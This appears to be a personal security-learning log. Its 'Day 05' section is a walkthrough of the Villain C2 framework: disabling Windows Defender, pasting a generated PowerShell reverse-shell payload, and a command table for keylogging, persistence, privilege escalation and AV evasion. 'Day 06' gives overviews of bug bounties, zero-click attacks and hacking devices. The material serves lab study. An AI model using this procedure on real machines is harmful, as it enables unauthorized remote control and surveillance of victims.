# Day 05
# Creating Reverse shell for Windows Hacking using Villain FrameWork🕵️‍♂️💻

   Villain is a C2 (Command & Control) framework for managing reverse shells and backdoors across multiple machines.  
---
## 1. Installation

   ## Clone the Repository
```bash
git clone https://github.com/t3l3machus/Villain.git
cd Villain
```
   ## Install Requirements
```bash
sudo apt update
sudo apt install python3 python3-pip
pip3 install -r requirements.txt
```
## 2. Launch Villain
   Enter into Villain Directory by,
```bash
cd Villain
```
   Then launch Villain by pasting the below code.
```bash
sudo python3 Villain.py
```
<img width="1108" height="632" alt="Screenshot 2025-08-10 125426" src="https://github.com/user-attachments/assets/892e8110-a138-476a-b00a-a37325482824" /> 

## 3. Turn off Windows Defender

   - In Victum Machine(Windows).
  
      →Goto Windows Security
  
      →Virus & thread Protection
  
      →Virus & thread Protection Settings(Click Manage Settings)
  
      →Turn off Real-time Protection
    
## 4. Execute the Payload in Windows

   - Copy the generated payload in the kali linux (Ctrl+Shift+C to Copy).
  
     <img width="1104" height="692" alt="Screenshot 2025-08-10 142143" src="https://github.com/user-attachments/assets/e00e2111-9275-4934-9f1d-dba5e7b72491" />

   - Open Windows Power Shell
     * paste the payload and click Enter.
  
     <img width="1472" height="404" alt="Screenshot 2025-08-10 142656" src="https://github.com/user-attachments/assets/6e65310e-3974-46f7-b226-e627e9710270" />

   - You can see the new sessiion established in Villain Frame Work.

     <img width="1103" height="468" alt="Screenshot 2025-08-10 144331" src="https://github.com/user-attachments/assets/3bda2bed-8807-4e23-b4c2-61cd165a0fab" />
## 5. Villain Framework – Command Reference💀

   A categorized list of **Villain C2 Framework** commands with their uses.  
   Use this for penetration testing in **authorized lab environments only**.

---

## 1. General & Utility Commands
   | Command | Purpose |
   |---------|---------|
   | `help` | Displays all available commands. |
   | `clear` | Clears the terminal. |
   | `exit` / `quit` | Exit the Villain interface. |
   | `banner` | Show the Villain banner again. |
   | `update` | Update Villain from the GitHub repo. |
   | `flee` | Exit Villain without killing active sessions. |

---

## 2. Payload Generation
| Command | Purpose |
|---------|---------|
| `generate` | Launch payload creation wizard. |
| `generate payload=<type> lhost=<IP/interface> [lport=<port>]` | Create a payload directly. |
| Example | `generate payload=windows/reverse_tcp/powershell lhost=eth0 lport=4444` |

You can edit them for **customization and AV evasion**.

---

## 3. Session Management
| Command | Purpose |
|---------|---------|
| `sessions` | List all active sessions. |
| `sessions -k <ID>` | Kill a session. |
| `shell <ID>` | Interact with a specific session. |
| `background` | Send current session to background. |

---

## 4. Interactive Session Commands
| Command | Purpose |
|---------|---------|
| `whoami` | Show current user on target. |
| `sysinfo` | Get target system information. |
| `upload <local> <remote>` | Upload file to target. |
| `download <remote> <local>` | Download file from target. |
| `inject <script>` | Inject and execute script. |
| `screenshot` | Capture screenshot (Windows only). |
| `keyscan_start` / `keyscan_dump` | Start and dump keylogger data. |
| `conpty` | Launch interactive ConPtyShell (Windows). |

---

## 5. Collaboration & Multiplayer
| Command | Purpose |
|---------|---------|
| `connect <IP> <port>` | Connect to another Villain server. |
| `siblings` | Show connected sibling servers. |
| `share <ID>` | Share a session with sibling server. |
| `#<message>` | Send chat message to all connected servers. |

---

## 6. Stability & Persistence
| Command | Purpose |
|---------|---------|
| `persistence` | Install persistence mechanism on target. |
| `privesc` | Run privilege escalation scripts/checks. |
| `defender` | Enable Session Defender to prevent shell hang due to typos. |

---

## ⚠ Legal Disclaimer
This information is for **educational purposes** only.  
Use **only** in environments where you have explicit permission.  
Unauthorized access to computer systems is illegal.

---
# Day 06
# 🐞 Bug Bounty


   A Bug Bounty Program is a deal offered by many websites, organizations, and software developers where individuals can receive recognition and compensation for reporting bugs, especially security vulnerabilities.
## 🏹 Common Vulnerabilities Found in Bug Bounties

   * These are the most reported bugs (you’ll hear them a lot):

   * Broken Access Control (BAC) – Users access data/actions they shouldn’t.

   * IDOR (Insecure Direct Object Reference) – Example: Changing user ID in a URL to view another user’s data.

   * XSS (Cross-Site Scripting) – Injecting malicious scripts in a web page.

   * CSRF (Cross-Site Request Forgery) – Forcing users to execute unwanted actions.

   * SQL Injection (SQLi) – Manipulating database queries.

   * SSRF (Server-Side Request Forgery) – Making the server perform unauthorized requests.

   * Authentication & Authorization Bypasses – Login without valid credentials.

---

## 🌐 Popular Bug Bounty Platforms

   - Here are the top websites where you can find programs:

   - HackerOne → Biggest platform, hosts programs for Uber, Twitter (X), Shopify.

   - Bugcrowd → Wide variety of private/public programs.

   - Intigriti → European-based platform, rising fast.

   - YesWeHack → Strong EU presence.

   - Open Bug Bounty → Free & open.

---

## 🛠 Tools You’ll Need

  - Burp Suite (proxy & scanner)

  - Nmap (network scanning)

  - SQLmap (SQL injection)

  - Dirsearch/Gobuster (directory brute force)

  - Subfinder/Amass (subdomain enumeration)

  - Postman/Insomnia (API testing)
---
## 🛑Zero-Click Attack?

   A Zero-Click Attack is a type of cyberattack where the victim doesn’t need to click, open, or interact with anything.

   * The attack happens automatically once the malicious data reaches the device.

   * Usually targets messaging apps, email apps, or VoIP services that process data in the background.

   - In simple words → your phone or system gets hacked without you doing anything.
## ⚡ How It Works

* Attacker sends a malicious payload (SMS, MMS, email, image, audio, or call).

* The vulnerable app automatically processes it (parsing image, previewing message, etc.).

* Malicious code executes silently → attacker gains control.

* Victim doesn’t see any suspicious message → no evidence.

## 🎯 Examples of Zero-Click Attacks

 Pegasus Spyware (NSO Group)

  - Exploited iMessage & WhatsApp with zero-click.

  - Just receiving a specially crafted iMessage was enough → full phone takeover (camera, mic, data).

 WhatsApp 2019 Vulnerability

  - Attackers made a missed call → installed spyware.

 Apple Mail Zero-Click (2020)

  - Malicious emails triggered memory corruption without being opened.

---
# 🔥Famous Hacking Devices

## 📡 WiFi Pineapple
- The WiFi Pineapple is a device designed for Wi-Fi security testing.  
- It can create rogue access points to trick users into connecting.  
- Attackers can perform man-in-the-middle attacks and capture data.  
- It’s widely used in penetration testing to demonstrate wireless risks.  

## 💻 USB Rubber Ducky
- The Rubber Ducky looks like a regular USB flash drive.  
- When plugged in, it acts as a keyboard and executes commands quickly.  
- It is often used to deliver malicious payloads in seconds.  
- Security testers use it to show how dangerous USB devices can be.  

## 🦊 Flipper Zero
- The Flipper Zero is a portable multi-tool for hackers.  
- It supports RFID, NFC, infrared, Bluetooth, and Sub-GHz radio signals.  
- It can clone access cards, control IoT devices, and test wireless security.  
- Its open-source nature makes it extremely popular with security researchers.

## 🐇 Bash Bunny
- The Bash Bunny is a powerful USB attack platform.  
- It can function as a keyboard, network adapter, and storage device at once.  
- It automates data exfiltration, credential theft, and penetration testing tasks.  
- It is favored for advanced red team operations due to its versatility.  

## 📻 HackRF One
- HackRF One is a software-defined radio (SDR) device.  
- It can capture, analyze, and transmit radio signals between 1 MHz and 6 GHz.  
- Researchers use it for testing GPS spoofing, wireless communications, and IoT security.  
- It is one of the most advanced tools for wireless and signal hacking.  
